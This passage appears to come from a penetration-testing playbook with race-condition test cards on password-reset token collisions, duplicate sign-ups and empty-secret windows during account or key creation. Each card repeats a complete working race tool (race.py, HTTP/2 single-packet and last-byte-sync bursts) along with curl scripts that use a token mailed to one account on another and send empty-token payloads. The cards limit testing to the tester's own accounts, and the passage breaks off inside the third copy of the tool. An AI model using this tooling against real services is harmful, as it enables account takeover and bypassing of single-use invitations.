  (the first digit of the third group is `1`), short numbers. A and B are our own accounts with mailboxes we read.
- **Test:** two causes, one observable. The token comes from the clock, or from a generator seeded with it, so two
  requests handled in the same instant get the same token. Or the flow stores "whom we are resetting" in the
  session and then mints and mails the token, so two resets in one session cross over. Release resets for A and B
  together, compare what each mailbox received, and use a token mailed to A against B.
- **How:** the first block is the same in every RAC card; the second holds this card's steps, with the saved
  requests in place of the example paths.
  ```bash
  # 0. race.py and sessions(): this block is the same in every RAC card; race.py is written once per engagement
  mkdir -p "$E/tools"; [ -s "$E/tools/race.py" ] || cat > "$E/tools/race.py" <<'PY'
  # race.py: release up to 50 requests together and print what each returned (needs: python3 -m pip install --user h2).
  # HTTP/2 (default) is the single-packet attack: all requests go out but their last byte, a PING round trip shows the server
  # has read them, then every last byte leaves in one write. --h1 is last-byte sync: one connection per request.
  # race.py [-n 20] [--h1] [--warm PATH] [--stagger MS] [--each FILE] [--out DIR] [-k] [curl -A/-H args] -- [COUNT] METHOD URL [BODY|@file] [-- ...]
  # Templates without COUNT repeat in turn up to -n; {i} (URL, body, header) is the request number; --each gives request i the header on line i
  # of FILE (a session per request); --stagger releases them MS ms apart. Afterwards it sleeps n/$RATE s for the rate limit.
  import os, re, socket, ssl, sys, threading, time
  from collections import Counter
  from urllib import parse
  a, o, fl, hd = sys.argv[1:], {'-n': '20', '--warm': '', '--stagger': '0', '--each': '', '--out': '', '--timeout': '20'}, set(), []
  while a and a[0] != '--':
      k = a.pop(0)
      if k in ('--h1', '-k'): fl.add(k); continue
      if k not in o and k not in ('-A', '-H'): sys.exit('race.py: unknown option ' + k)
      v = a.pop(0)
      if k in o: o[k] = v; continue
      for ln in ['User-Agent: ' + v] if k == '-A' else open(v[1:]).read().splitlines() if v[:1] == '@' else [v]:
          n, _, w = ln.partition(':')
          if n.strip() and w.strip(): hd.append((n.strip().lower(), w.strip()))
  tpl, cnt = [t.split('\0') for t in '\0'.join(a[1:]).split('\0--\0') if t], lambda t: int(t[0]) if t[0].isdigit() else 0
  seq = [t[1:] if cnt(t) else t for t in tpl for _ in range(cnt(t) or 1)] if any(map(cnt, tpl)) else [tpl[i % len(tpl)] for i in range(int(o['-n']) * bool(tpl))]
  if not 0 < len(seq) <= 50: sys.exit('race.py: give 1 to 50 requests after --; more is load, not a race')
  each, R = [x for x in open(o['--each']) if ':' in x] if o['--each'] else [], []
  DROP = {'host', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 'upgrade', 'te', 'content-length'}
  for i, t in enumerate(seq):
      b, h = t[2] if len(t) > 2 else '', list(hd)
      b = (open(b[1:], 'rb').read() if b[:1] == '@' else b.encode()).replace(b'{i}', str(i).encode())
      if each: n, _, w = each[i % len(each)].partition(':'); h = [x for x in h if x[0] != n.strip().lower()] + [(n.strip().lower(), w.strip())]
      R.append((t[0].upper(), parse.urlsplit(t[1].replace('{i}', str(i))), [(k, v.replace('{i}', str(i))) for k, v in h if k not in DROP], b))
  u0, N, res = R[0][1], len(R), [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in R]
  if any(r[1][:2] != u0[:2] for r in R): sys.exit('race.py: all requests must go to one origin')
  TLS, TO, RATE, GAP = (u0.scheme == 'https'), float(o['--timeout']), float(os.environ.get('RATE') or 1), float(o['--stagger']) / 1000
  def path(u): return (u[2] or '/') + ('?' + u[3] if u[3] else '')  # path and query of a split URL
  def conn(alpn):
      s = socket.create_connection((u0.hostname, (u0.port or (443 if TLS else 80))), timeout=TO)
      s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
      if not TLS: return s
      cx = ssl.create_default_context(); cx.set_alpn_protocols([alpn])
      if '-k' in fl: cx.check_hostname, cx.verify_mode = False, ssl.CERT_NONE
      return cx.wrap_socket(s, server_hostname=u0.hostname)
  def h2run():
      from h2 import config, connection, events as ev
      s = conn('h2')
      if TLS and s.selected_alpn_protocol() != 'h2': sys.exit('race.py: the server did not negotiate HTTP/2: use --h1')
      c = connection.H2Connection(config.H2Configuration(client_side=True, header_encoding='utf-8'))
      c.initiate_connection(); s.sendall(c.data_to_send()); rec, flag = {}, set()
      def pump(done, limit):
          end = time.time() + limit
          while not done() and time.time() < end and 'gone' not in flag:
              s.settimeout(max(0.05, end - time.time()))
              try: data = s.recv(65536)
              except (socket.timeout, TimeoutError): break
              if not data: flag.add('gone'); break
              for e in c.receive_data(data):
                  r = rec.get(getattr(e, 'stream_id', None))
                  if isinstance(e, ev.ResponseReceived) and r: r.update(t1=time.time(), hd=e.headers, st=dict(e.headers)[':status'])
                  elif isinstance(e, ev.DataReceived):
                      if r: r['body'] += bytes(e.data)
                      c.acknowledge_received_data(e.flow_controlled_length, e.stream_id)
                  elif isinstance(e, ev.StreamEnded) and r: r['t2'] = time.time()
                  elif isinstance(e, ev.StreamReset) and r: r.update(t2=time.time(), st='RST')
                  elif isinstance(e, ev.PingAckReceived): flag.add('pong')
                  elif isinstance(e, ev.RemoteSettingsChanged): flag.add('settings')
                  elif isinstance(e, ev.ConnectionTerminated): flag.add('gone')
              s.sendall(c.data_to_send())
      def start(m, u, h, b, r, end=False):
          sid, cl = c.get_next_available_stream_id(), [('content-length', str(len(b)))] if b or m in ('POST', 'PUT', 'PATCH') else []
          rec[sid] = r; c.send_headers(sid, [(':method', m), (':authority', u.netloc), (':scheme', u.scheme), (':path', path(u))] + h + cl, end_stream=end)
          return sid
      def data(sid, b, end):
          mx = c.max_outbound_frame_size; ch = [b[j:j + mx] for j in range(0, len(b), mx)] or [b'']
          for j, x in enumerate(ch):
              if x or end: c.send_data(sid, x, end_stream=end and j == len(ch) - 1)
      pump(lambda: 'settings' in flag, 5)
      if 'settings' not in flag: sys.exit('race.py: no HTTP/2 SETTINGS frame from the server: use --h1')
      if o['--warm']:  # three GETs on this connection first, so that the burst does not pay for a cold connection
          w = [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in range(3)]
          for r in w: start('GET', u0._replace(path=o['--warm'], query=''), [x for x in hd if x[0] not in DROP], b'', r, True)
          s.sendall(c.data_to_send()); pump(lambda: all(r['t2'] for r in w), TO)
      if sum(len(x[3]) for x in R) > 60000: sys.exit('race.py: the bodies exceed one flow-control window: keep them small')
      sids = [start(*x, r) for x, r in zip(R, res)]
      for sid, x in zip(sids, R): data(sid, x[3][:-1], False)
      s.sendall(c.data_to_send()); c.ping(b'race.py!'); s.sendall(c.data_to_send()); pump(lambda: 'pong' in flag, 5)
      last = []
      for sid, x in zip(sids, R): data(sid, x[3][-1:], True); last.append(c.data_to_send())
      if GAP:
          for q, r in zip(last, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      else:
          t0 = time.time(); s.sendall(b''.join(last))
          for r in res: r['t0'] = t0
      pump(lambda: all(r['t2'] for r in res), TO)
  def h1run():
      def rd(s, r):
          buf = b''
          while True:
              try: x = s.recv(65536)
              except OSError: break
              if not x: break
              buf, r['t1'] = buf + x, r['t1'] or time.time()
          head, _, r['body'] = buf.partition(b'\r\n\r\n'); ln = head.decode('latin-1').split('\r\n')
          r.update(t2=time.time(), st=(ln[0].split(' ') + ['-', '-'])[1], hd=[tuple(x.split(': ', 1)) for x in ln[1:] if ': ' in x])
      socks = []
      for m, u, h, b in R:
          ln = ['%s %s HTTP/1.1' % (m, path(u)), 'host: ' + u.netloc] + ['%s: %s' % x for x in h] + ['connection: close']
          q = ('\r\n'.join(ln + (['content-length: %d' % len(b)] if b or m in ('POST', 'PUT', 'PATCH') else [])) + '\r\n\r\n').encode() + b
          s = conn('http/1.1'); s.sendall(q[:-1]); socks.append((s, q[-1:]))
      th = [threading.Thread(target=rd, args=(s, r)) for (s, _), r in zip(socks, res)]
      for t in th: t.start()
      time.sleep(0.3)  # HTTP/1.1 has no PING: give the partial requests time to arrive
      for (s, q), r in zip(socks, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      for t in th: t.join(TO)
  h1run() if '--h1' in fl else h2run()
  print('# %d requests released %s over %s, %s' % (N, '%s ms apart' % o['--stagger'] if GAP else 'together', 'HTTP/1.1' if '--h1' in fl else 'HTTP/2', time.strftime('%H:%M:%S')))
  seen = Counter()
  for i, ((m, u, h, b), r) in enumerate(zip(R, res)):
      snip, ms = re.sub(r'\s+', ' ', r['body'][:100].decode('utf-8', 'replace')), '%8.1f' % ((r['t1'] - r['t0']) * 1000) if r['t1'] else '       -'
      print('%3d %-4s %7d %s ms  %s %s  %s' % (i, r['st'], len(r['body']), ms, m, path(u)[:40], snip[:70]))
      seen[(r['st'], re.sub(r'[0-9a-f]{8,}|\d+', '#', snip[:60]))] += 1
      if o['--out']:
          os.makedirs(o['--out'], exist_ok=True); hh = ''.join('%s: %s\n' % x for x in r['hd'])
          open(os.path.join(o['--out'], '%02d.txt' % i), 'wb').write(('%s %s\n' % (m, u.geturl())).encode() + b + ('\n\n%s\n%s\n' % (r['st'], hh)).encode() + r['body'])
  print('# outcomes (digits and hex ids folded):')
  for k, v in seen.most_common(): print('%5d x %-4s %s' % (v, k[0], k[1]))
  print('# ms from release to first response byte, sorted: ' + ' '.join('%.0f' % x for x in sorted((r['t1'] - r['t0']) * 1000 for r in res if r['t1'])))
  time.sleep(N / RATE)
  PY
  # sessions FILE PATH BODY: twenty logins with the saved login request, one Cookie line per session, for race.py --each FILE
  sessions(){ for i in $(seq 1 20); do curl -sS "${HDR[@]}" -c "$1.jar" -o /dev/null -X POST "$T$2" -H "Content-Type: ${LOGIN_CT:-application/json}" -d "$3"
    printf 'Cookie: %s\n' "$(sed 's/^#HttpOnly_//' "$1.jar" | grep -v '^#' | awk 'NF>=7{printf "%s%s=%s", s, $6, $7; s="; "}')"; rm -f "$1.jar"; sleep 1; done > "$1"; }
  ```
  ```bash
  D="$E/evidence/$H/RAC-007"; mkdir -p "$D/mail"; CT='Content-Type: application/json'
  EA='<A e-mail>'; EB='<B e-mail>'
  # 0. the token's shape: two ordinary resets of A, ten seconds apart (length, alphabet, shared prefix, UUID version)
  for i in 1 2; do curl -sS "${HDR[@]}" -X POST "$T/password/reset" -H "$CT" -d "{\"email\":\"$EA\"}" -o /dev/null -w "reset $i: %{http_code}\n"; sleep 10; done
  # 1. resets for A and B in one packet, five of each, without a session (--h1 without HTTP/2)
  python3 "$E/tools/race.py" "${HDR[@]}" -H "$CT" -n 10 --out "$D/burst-1" \
    -- POST "$T/password/reset" "{\"email\":\"$EA\"}" -- POST "$T/password/reset" "{\"email\":\"$EB\"}" | tee "$D/burst-1.txt"
  # 2. one reset for each inside one guest session, for flows that keep "whom we are resetting" in the session
  curl -sS "${HDR[@]}" -c "$D/guest.jar" -o /dev/null "$T/password/reset"
  printf 'Cookie: %s\n' "$(sed 's/^#HttpOnly_//' "$D/guest.jar" | grep -v '^#' | awk 'NF>=7{printf "%s%s=%s", s, $6, $7; s="; "}')" > "$D/guest.headers"
  python3 "$E/tools/race.py" "${HDR[@]}" -H @"$D/guest.headers" -H "$CT" \
    -- 1 POST "$T/password/reset" "{\"email\":\"$EA\"}" -- 1 POST "$T/password/reset" "{\"email\":\"$EB\"}" | tee "$D/burst-2.txt"
  # 3. save both mailboxes' messages as $D/mail/A-*.eml and $D/mail/B-*.eml; links found in both are collisions
  links(){ grep -hoE "$H/[^\" <>]*" "$D"/mail/$1-*.eml | grep -iE 'reset|token|password' | sort -u; }
  links A > "$D/links-A.txt"; links B > "$D/links-B.txt"; comm -12 "$D/links-A.txt" "$D/links-B.txt" | tee "$D/shared-links.txt"
  # 4. a token mailed to A, used for B (ours); then B signs in with the new password
  curl -sS "${HDR[@]}" -X POST "$T/password/reset/confirm" -H "$CT" \
    -d "{\"token\":\"<token from a mail to A>\",\"email\":\"$EB\",\"password\":\"Rac007-new-pw!\"}" -D- -o "$D/confirm.json"
  curl -sS "${HDR[@]}" -X POST "$T/api/login" -H "$CT" -d "{\"email\":\"$EB\",\"password\":\"Rac007-new-pw!\"}" -o /dev/null -w 'B with the new password: %{http_code}\n'
  ```
  Open one link from A's mailbox in a clean browser session as well: a reset page that greets B or shows B's
  address is the session crossover even when the token strings differ. Put B's own password back afterwards.
- **Proof:** two raw mails, one to A and one to B, carrying the same token, or a link from A's mailbox that opens
  B's reset; B's password set with that token and B signing in with it; the burst output with times; the rate
  (k of n pairs). Our two accounts only.
- **Not a finding when:** the same token twice for the same account (a resend that reuses the live token by
  design: AUT-004); tokens that differ but share a time-based prefix (worth AUT-002's analysis, not yet a
  takeover); the confirm step binds the token to the account server-side and refuses A's token for B.
- **Escalate:** a predictable structure without a collision is AUT-002 (compute the tokens). The same collision on
  login links is takeover without a reset; on verification tokens it verifies an address (RAC-006's
  consequences); on invitations it admits the wrong person.

### RAC-008 · Registrations released in one packet create two accounts with one e-mail address, username or single-use invitation

| | |
|---|---|
| **Severity** | Low standalone; Medium when a single-use invitation or access code admits several accounts, or when the duplicate receives what is addressed to the other (payments, mentions, the reset or the SSO login), shown between our own accounts |
| **Requires** | signup |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition') · CWE-362 |
| **Prior art** | #148609, #785833, #1224008 |

- **Where:** the sign-up request and its API and mobile versions, username and handle claims, organisation or team
  slugs, sign-up with an invitation or access code, "one trial per address" sign-ups. Every address is a fresh one
  of ours (a plus-alias where the product accepts it); the invitation or access code is one issued to us.
- **Test:** the uniqueness check is a lookup before the insert with no unique index behind it, so registrations
  released together all find nothing and all insert. The duplicate matters only through what follows: which
  account the login opens, which one the reset mail resets, whether verifying one verifies the other, which one
  an SSO login picks.
- **How:** the first block is the same in every RAC card; the second holds this card's steps, with the saved
  requests in place of the example paths.
  ```bash
  # 0. race.py and sessions(): this block is the same in every RAC card; race.py is written once per engagement
  mkdir -p "$E/tools"; [ -s "$E/tools/race.py" ] || cat > "$E/tools/race.py" <<'PY'
  # race.py: release up to 50 requests together and print what each returned (needs: python3 -m pip install --user h2).
  # HTTP/2 (default) is the single-packet attack: all requests go out but their last byte, a PING round trip shows the server
  # has read them, then every last byte leaves in one write. --h1 is last-byte sync: one connection per request.
  # race.py [-n 20] [--h1] [--warm PATH] [--stagger MS] [--each FILE] [--out DIR] [-k] [curl -A/-H args] -- [COUNT] METHOD URL [BODY|@file] [-- ...]
  # Templates without COUNT repeat in turn up to -n; {i} (URL, body, header) is the request number; --each gives request i the header on line i
  # of FILE (a session per request); --stagger releases them MS ms apart. Afterwards it sleeps n/$RATE s for the rate limit.
  import os, re, socket, ssl, sys, threading, time
  from collections import Counter
  from urllib import parse
  a, o, fl, hd = sys.argv[1:], {'-n': '20', '--warm': '', '--stagger': '0', '--each': '', '--out': '', '--timeout': '20'}, set(), []
  while a and a[0] != '--':
      k = a.pop(0)
      if k in ('--h1', '-k'): fl.add(k); continue
      if k not in o and k not in ('-A', '-H'): sys.exit('race.py: unknown option ' + k)
      v = a.pop(0)
      if k in o: o[k] = v; continue
      for ln in ['User-Agent: ' + v] if k == '-A' else open(v[1:]).read().splitlines() if v[:1] == '@' else [v]:
          n, _, w = ln.partition(':')
          if n.strip() and w.strip(): hd.append((n.strip().lower(), w.strip()))
  tpl, cnt = [t.split('\0') for t in '\0'.join(a[1:]).split('\0--\0') if t], lambda t: int(t[0]) if t[0].isdigit() else 0
  seq = [t[1:] if cnt(t) else t for t in tpl for _ in range(cnt(t) or 1)] if any(map(cnt, tpl)) else [tpl[i % len(tpl)] for i in range(int(o['-n']) * bool(tpl))]
  if not 0 < len(seq) <= 50: sys.exit('race.py: give 1 to 50 requests after --; more is load, not a race')
  each, R = [x for x in open(o['--each']) if ':' in x] if o['--each'] else [], []
  DROP = {'host', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 'upgrade', 'te', 'content-length'}
  for i, t in enumerate(seq):
      b, h = t[2] if len(t) > 2 else '', list(hd)
      b = (open(b[1:], 'rb').read() if b[:1] == '@' else b.encode()).replace(b'{i}', str(i).encode())
      if each: n, _, w = each[i % len(each)].partition(':'); h = [x for x in h if x[0] != n.strip().lower()] + [(n.strip().lower(), w.strip())]
      R.append((t[0].upper(), parse.urlsplit(t[1].replace('{i}', str(i))), [(k, v.replace('{i}', str(i))) for k, v in h if k not in DROP], b))
  u0, N, res = R[0][1], len(R), [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in R]
  if any(r[1][:2] != u0[:2] for r in R): sys.exit('race.py: all requests must go to one origin')
  TLS, TO, RATE, GAP = (u0.scheme == 'https'), float(o['--timeout']), float(os.environ.get('RATE') or 1), float(o['--stagger']) / 1000
  def path(u): return (u[2] or '/') + ('?' + u[3] if u[3] else '')  # path and query of a split URL
  def conn(alpn):
      s = socket.create_connection((u0.hostname, (u0.port or (443 if TLS else 80))), timeout=TO)
      s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
      if not TLS: return s
      cx = ssl.create_default_context(); cx.set_alpn_protocols([alpn])
      if '-k' in fl: cx.check_hostname, cx.verify_mode = False, ssl.CERT_NONE
      return cx.wrap_socket(s, server_hostname=u0.hostname)
  def h2run():
      from h2 import config, connection, events as ev
      s = conn('h2')
      if TLS and s.selected_alpn_protocol() != 'h2': sys.exit('race.py: the server did not negotiate HTTP/2: use --h1')
      c = connection.H2Connection(config.H2Configuration(client_side=True, header_encoding='utf-8'))
      c.initiate_connection(); s.sendall(c.data_to_send()); rec, flag = {}, set()
      def pump(done, limit):
          end = time.time() + limit
          while not done() and time.time() < end and 'gone' not in flag:
              s.settimeout(max(0.05, end - time.time()))
              try: data = s.recv(65536)
              except (socket.timeout, TimeoutError): break
              if not data: flag.add('gone'); break
              for e in c.receive_data(data):
                  r = rec.get(getattr(e, 'stream_id', None))
                  if isinstance(e, ev.ResponseReceived) and r: r.update(t1=time.time(), hd=e.headers, st=dict(e.headers)[':status'])
                  elif isinstance(e, ev.DataReceived):
                      if r: r['body'] += bytes(e.data)
                      c.acknowledge_received_data(e.flow_controlled_length, e.stream_id)
                  elif isinstance(e, ev.StreamEnded) and r: r['t2'] = time.time()
                  elif isinstance(e, ev.StreamReset) and r: r.update(t2=time.time(), st='RST')
                  elif isinstance(e, ev.PingAckReceived): flag.add('pong')
                  elif isinstance(e, ev.RemoteSettingsChanged): flag.add('settings')
                  elif isinstance(e, ev.ConnectionTerminated): flag.add('gone')
              s.sendall(c.data_to_send())
      def start(m, u, h, b, r, end=False):
          sid, cl = c.get_next_available_stream_id(), [('content-length', str(len(b)))] if b or m in ('POST', 'PUT', 'PATCH') else []
          rec[sid] = r; c.send_headers(sid, [(':method', m), (':authority', u.netloc), (':scheme', u.scheme), (':path', path(u))] + h + cl, end_stream=end)
          return sid
      def data(sid, b, end):
          mx = c.max_outbound_frame_size; ch = [b[j:j + mx] for j in range(0, len(b), mx)] or [b'']
          for j, x in enumerate(ch):
              if x or end: c.send_data(sid, x, end_stream=end and j == len(ch) - 1)
      pump(lambda: 'settings' in flag, 5)
      if 'settings' not in flag: sys.exit('race.py: no HTTP/2 SETTINGS frame from the server: use --h1')
      if o['--warm']:  # three GETs on this connection first, so that the burst does not pay for a cold connection
          w = [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in range(3)]
          for r in w: start('GET', u0._replace(path=o['--warm'], query=''), [x for x in hd if x[0] not in DROP], b'', r, True)
          s.sendall(c.data_to_send()); pump(lambda: all(r['t2'] for r in w), TO)
      if sum(len(x[3]) for x in R) > 60000: sys.exit('race.py: the bodies exceed one flow-control window: keep them small')
      sids = [start(*x, r) for x, r in zip(R, res)]
      for sid, x in zip(sids, R): data(sid, x[3][:-1], False)
      s.sendall(c.data_to_send()); c.ping(b'race.py!'); s.sendall(c.data_to_send()); pump(lambda: 'pong' in flag, 5)
      last = []
      for sid, x in zip(sids, R): data(sid, x[3][-1:], True); last.append(c.data_to_send())
      if GAP:
          for q, r in zip(last, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      else:
          t0 = time.time(); s.sendall(b''.join(last))
          for r in res: r['t0'] = t0
      pump(lambda: all(r['t2'] for r in res), TO)
  def h1run():
      def rd(s, r):
          buf = b''
          while True:
              try: x = s.recv(65536)
              except OSError: break
              if not x: break
              buf, r['t1'] = buf + x, r['t1'] or time.time()
          head, _, r['body'] = buf.partition(b'\r\n\r\n'); ln = head.decode('latin-1').split('\r\n')
          r.update(t2=time.time(), st=(ln[0].split(' ') + ['-', '-'])[1], hd=[tuple(x.split(': ', 1)) for x in ln[1:] if ': ' in x])
      socks = []
      for m, u, h, b in R:
          ln = ['%s %s HTTP/1.1' % (m, path(u)), 'host: ' + u.netloc] + ['%s: %s' % x for x in h] + ['connection: close']
          q = ('\r\n'.join(ln + (['content-length: %d' % len(b)] if b or m in ('POST', 'PUT', 'PATCH') else [])) + '\r\n\r\n').encode() + b
          s = conn('http/1.1'); s.sendall(q[:-1]); socks.append((s, q[-1:]))
      th = [threading.Thread(target=rd, args=(s, r)) for (s, _), r in zip(socks, res)]
      for t in th: t.start()
      time.sleep(0.3)  # HTTP/1.1 has no PING: give the partial requests time to arrive
      for (s, q), r in zip(socks, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      for t in th: t.join(TO)
  h1run() if '--h1' in fl else h2run()
  print('# %d requests released %s over %s, %s' % (N, '%s ms apart' % o['--stagger'] if GAP else 'together', 'HTTP/1.1' if '--h1' in fl else 'HTTP/2', time.strftime('%H:%M:%S')))
  seen = Counter()
  for i, ((m, u, h, b), r) in enumerate(zip(R, res)):
      snip, ms = re.sub(r'\s+', ' ', r['body'][:100].decode('utf-8', 'replace')), '%8.1f' % ((r['t1'] - r['t0']) * 1000) if r['t1'] else '       -'
      print('%3d %-4s %7d %s ms  %s %s  %s' % (i, r['st'], len(r['body']), ms, m, path(u)[:40], snip[:70]))
      seen[(r['st'], re.sub(r'[0-9a-f]{8,}|\d+', '#', snip[:60]))] += 1
      if o['--out']:
          os.makedirs(o['--out'], exist_ok=True); hh = ''.join('%s: %s\n' % x for x in r['hd'])
          open(os.path.join(o['--out'], '%02d.txt' % i), 'wb').write(('%s %s\n' % (m, u.geturl())).encode() + b + ('\n\n%s\n%s\n' % (r['st'], hh)).encode() + r['body'])
  print('# outcomes (digits and hex ids folded):')
  for k, v in seen.most_common(): print('%5d x %-4s %s' % (v, k[0], k[1]))
  print('# ms from release to first response byte, sorted: ' + ' '.join('%.0f' % x for x in sorted((r['t1'] - r['t0']) * 1000 for r in res if r['t1'])))
  time.sleep(N / RATE)
  PY
  # sessions FILE PATH BODY: twenty logins with the saved login request, one Cookie line per session, for race.py --each FILE
  sessions(){ for i in $(seq 1 20); do curl -sS "${HDR[@]}" -c "$1.jar" -o /dev/null -X POST "$T$2" -H "Content-Type: ${LOGIN_CT:-application/json}" -d "$3"
    printf 'Cookie: %s\n' "$(sed 's/^#HttpOnly_//' "$1.jar" | grep -v '^#' | awk 'NF>=7{printf "%s%s=%s", s, $6, $7; s="; "}')"; rm -f "$1.jar"; sleep 1; done > "$1"; }
  ```
  ```bash
  D="$E/evidence/$H/RAC-008"; mkdir -p "$D"; CT='Content-Type: application/json'
  NEW='<fresh address of ours, never registered here>'; CTL='<another fresh address of ours>'
  # 1. control: one address registered twice, a second apart; the second must be refused
  for i in 1 2; do curl -sS "${HDR[@]}" -X POST "$T/api/register" -H "$CT" -d "{\"email\":\"$CTL\",\"password\":\"Rac008-ctl-$i!\"}" \
    -o "$D/control-$i.json" -w "control $i: %{http_code}\n"; sleep 1; done
  # 2. twenty registrations of NEW in one packet, each with its own password (--h1 without HTTP/2)
  python3 "$E/tools/race.py" "${HDR[@]}" -H "$CT" -n 20 --out "$D/burst-1" \
    -- POST "$T/api/register" "{\"email\":\"$NEW\",\"password\":\"Rac008-pw-{i}!\",\"name\":\"rac008-{i}\"}" | tee "$D/burst-1.txt"
  # 3. how many accounts: sign in with each password and print the user id it opens
  for i in $(seq 0 19); do curl -sS "${HDR[@]}" -c "$D/j$i" -o /dev/null -X POST "$T/api/login" -H "$CT" -d "{\"email\":\"$NEW\",\"password\":\"Rac008-pw-$i!\"}"
    echo "$i $(curl -sS "${HDR[@]}" -b "$D/j$i" "$T/api/me" | grep -oE '"(id|user_id|uuid)":"?[^,"]+' | head -1)"; sleep 1; done | tee "$D/logins.txt"
  awk 'NF>1{print $2}' "$D/logins.txt" | sort | uniq -c      # more than one distinct id is a duplicate
  # 4. one username claimed by twenty fresh addresses, and one single-use invitation code used by twenty registrations
  python3 "$E/tools/race.py" "${HDR[@]}" -H "$CT" -n 20 -- POST "$T/api/register" \
    '{"email":"<our mailbox>+rac008-{i}@<our domain>","password":"Rac008-pw-{i}!","username":"rac008handle"}' | tee "$D/burst-username.txt"
  python3 "$E/tools/race.py" "${HDR[@]}" -H "$CT" -n 20 -- POST "$T/api/register" \
    '{"email":"<our mailbox>+rac008-inv-{i}@<our domain>","password":"Rac008-pw-{i}!","invite_code":"<single-use code issued to us>"}' | tee "$D/burst-invite.txt"
  # then, between the duplicates: request a reset for NEW and see which account it changes; open the verification
  # link and see which accounts become verified; delete every duplicate afterwards and list them in cleanup.md
  ```
- **Proof:** two or more user ids for one e-mail address, username or single-use code (the `/api/me` of each,
  reached with the burst's own passwords), and a consequence shown between our own duplicates: the reset changes
  one while the other keeps its password and session, a mention, message or payment addressed to the handle
  reaching the other account, or several accounts admitted on one invitation. #785833 and #1224008 are titled as
  account takeovers through registering one address again; read how (`scripts/sane kb show 785833`) before
  claiming the same.
- **Not a finding when:** the duplicates are merged, or one is deleted within minutes; only display names collide
  (#3248712, "Multiple Organizations with the Same Name", was titled "Not a Vuln" and closed as not applicable);
  the second account can neither sign in nor verify; two plus-alias variants of one mailbox, which the product
  treats as different addresses by design (AUT-012 covers the spellings it treats as equal).
- **Escalate:** a duplicate of an address that an SSO login later claims is AUT-013; spellings of one address
  treated as different are AUT-012; a trial or bonus per address obtained twice is BIZ-012 (`promo-abuse` where the
  policy excludes it).

### RAC-009 · A request that reaches an account, key or invitation while it is still being created finds it with an empty secret or without its restrictions

| | |
|---|---|
| **Severity** | High standalone when an empty secret confirms an address whose mailbox was never opened; Medium when an empty key authenticates as the account during the key's creation; Low when the window only affects our own new object |
| **Requires** | signup\|invite\|api-keys |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition') · CWE-362, CWE-665 |
| **Prior art** | #1428690, #604534, #2216036 |

- **Where:** creation flows that insert a record and set its secret or its restrictions in a later write: sign-up
  followed by a confirmation token, API key creation, invitation creation, a password set at first login, a role
  or plan applied after the account row exists, an object moved between owners (#2216036: repository permissions
  changed during a transfer). The library has no disclosed empty-token race; the nearest are a concurrent join
  that left a group member nobody could remove (#604534) and a race while creating profiles, filed as privilege
  escalation (#1428690). The API-key and invitation forms need account A.
- **Test:** between the insert and the write that sets the token, the token column is empty. A comparison that
  treats a missing value as a match accepts a request carrying no secret: PHP's loose `==` treats an empty string,
  an empty array and `null` as equal to NULL, and ORM lookups given a nil value (`find_by(token: nil)` in Rails,
  `filter(token=None)` in Django) become `IS NULL`. So the spellings are `token=` in a query and `""`, `[]` and
  `null` in JSON; PHP parses `token[]=` as an array holding one empty string, which does not equal NULL. Release
  the creating request together with twenty uses that carry an empty secret, spread over the next 40 ms.
- **How:** the first block is the same in every RAC card; the second holds this card's steps, with the saved
  requests in place of the example paths.
  ```bash
  # 0. race.py and sessions(): this block is the same in every RAC card; race.py is written once per engagement
  mkdir -p "$E/tools"; [ -s "$E/tools/race.py" ] || cat > "$E/tools/race.py" <<'PY'
  # race.py: release up to 50 requests together and print what each returned (needs: python3 -m pip install --user h2).
  # HTTP/2 (default) is the single-packet attack: all requests go out but their last byte, a PING round trip shows the server
  # has read them, then every last byte leaves in one write. --h1 is last-byte sync: one connection per request.
  # race.py [-n 20] [--h1] [--warm PATH] [--stagger MS] [--each FILE] [--out DIR] [-k] [curl -A/-H args] -- [COUNT] METHOD URL [BODY|@file] [-- ...]
  # Templates without COUNT repeat in turn up to -n; {i} (URL, body, header) is the request number; --each gives request i the header on line i
  # of FILE (a session per request); --stagger releases them MS ms apart. Afterwards it sleeps n/$RATE s for the rate limit.
  import os, re, socket, ssl, sys, threading, time
  from collections import Counter
  from urllib import parse
  a, o, fl, hd = sys.argv[1:], {'-n': '20', '--warm': '', '--stagger': '0', '--each': '', '--out': '', '--timeout': '20'}, set(), []
  while a and a[0] != '--':
      k = a.pop(0)
      if k in ('--h1', '-k'): fl.add(k); continue
      if k not in o and k not in ('-A', '-H'): sys.exit('race.py: unknown option ' + k)
      v = a.pop(0)
      if k in o: o[k] = v; continue
      for ln in ['User-Agent: ' + v] if k == '-A' else open(v[1:]).read().splitlines() if v[:1] == '@' else [v]:
          n, _, w = ln.partition(':')
          if n.strip() and w.strip(): hd.append((n.strip().lower(), w.strip()))
  tpl, cnt = [t.split('\0') for t in '\0'.join(a[1:]).split('\0--\0') if t], lambda t: int(t[0]) if t[0].isdigit() else 0
  seq = [t[1:] if cnt(t) else t for t in tpl for _ in range(cnt(t) or 1)] if any(map(cnt, tpl)) else [tpl[i % len(tpl)] for i in range(int(o['-n']) * bool(tpl))]
  if not 0 < len(seq) <= 50: sys.exit('race.py: give 1 to 50 requests after --; more is load, not a race')
  each, R = [x for x in open(o['--each']) if ':' in x] if o['--each'] else [], []
  DROP = {'host', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 'upgrade', 'te', 'content-length'}
  for i, t in enumerate(seq):
      b, h = t[2] if len(t) > 2 else '', list(hd)
      b = (open(b[1:], 'rb').read() if b[:1] == '@' else b.encode()).replace(b'{i}', str(i).encode())
